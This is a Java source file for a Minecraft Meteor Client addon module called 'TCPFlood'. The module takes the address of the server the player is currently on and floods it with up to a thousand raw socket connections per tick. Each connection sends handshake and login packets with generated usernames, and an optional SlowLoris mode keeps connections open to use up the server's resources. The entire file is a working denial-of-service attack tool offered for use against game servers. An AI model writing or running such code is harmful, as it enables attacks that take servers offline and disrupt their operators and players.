package com.client2end.addon.modules;

import com.client2end.addon.Client2End;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.text.Text;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicInteger;

public class TCPFlood extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> connectionsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("connections")
        .description("Connections per tick")
        .defaultValue(10)
        .min(1)
        .max(1000)
        .sliderRange(1, 1000)
        .build()
    );

    private final Setting<Boolean> keepAlive = sgGeneral.add(new BoolSetting.Builder()
        .name("keep-alive")
        .description("Keep connections open (SlowLoris mode)")
        .defaultValue(false)
        .build()
    );

    private String host;
    private int port;
    private int idCounter;
    private int sent;
    private final AtomicInteger active = new AtomicInteger(0);
    private int lastSent;

    public TCPFlood() {
        super(Client2End.CATEGORY, "tcp-flood", "TCP connection flood via raw sockets");
    }

    @Override
    public void onActivate() {
        if (mc.getCurrentServerEntry() == null) {
            error("Not connected to a server");
            toggle();
            return;
        }
        String addr = mc.getCurrentServerEntry().address;
        String[] parts = addr.split(":");
        host = parts[0];
        port = parts.length > 1 ? Integer.parseInt(parts[1]) : 25565;
        idCounter = 0;
        sent = 0;
        lastSent = 0;
        active.set(0);
        info("Target: " + host + ":" + port);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (host == null || mc.player == null) return;

        int count = connectionsPerTick.get();
        for (int i = 0; i < count; i++) {
            int id = idCounter++;
            new Thread(() -> flood(id), "tcp-flood-" + id).start();
        }
        sent += count;

        int rate = (sent - lastSent) * 20;
        lastSent = sent;
        mc.player.sendMessage(Text.literal(
            "[§5TCPFlood§r] §e" + sent + " §7sent §8| §b" + rate + "/sec §8| §a" + active.get() + " §7open"
        ), false);
    }

    private void flood(int id) {
        active.incrementAndGet();
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), 5000);
            socket.setSoTimeout(10000);

            DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

            ByteArrayOutputStream hs = new ByteArrayOutputStream();
            DataOutputStream hOut = new DataOutputStream(hs);
            writeVarInt(hOut, 0x00);
            writeVarInt(hOut, 767);
            writeString(hOut, host);
            hOut.writeShort(port);
            writeVarInt(hOut, 2);
            sendPacket(dos, hs.toByteArray());

            ByteArrayOutputStream ls = new ByteArrayOutputStream();
            DataOutputStream lOut = new DataOutputStream(ls);
            writeVarInt(lOut, 0x00);
            writeString(lOut, "F_" + id);
            sendPacket(dos, ls.toByteArray());

            if (keepAlive.get()) {
                Thread.sleep(30000);
            }

            dos.close();
        } catch (Exception ignored) {}
        active.decrementAndGet();
    }

    private void writeVarInt(DataOutputStream out, int value) throws Exception {
        do {
            byte temp = (byte) (value & 0x7F);
            value >>>= 7;
            if (value != 0) temp |= 0x80;
            out.writeByte(temp);
        } while (value != 0);
    }

    private void writeString(DataOutputStream out, String s) throws Exception {
        byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private void sendPacket(DataOutputStream dos, byte[] data) throws Exception {
        ByteArrayOutputStream frame = new ByteArrayOutputStream();
        DataOutputStream fOut = new DataOutputStream(frame);
        writeVarInt(fOut, data.length);
        fOut.write(data);
        dos.write(frame.toByteArray());
        dos.flush();
    }

    @Override
    public void onDeactivate() {
        host = null;
    }
}
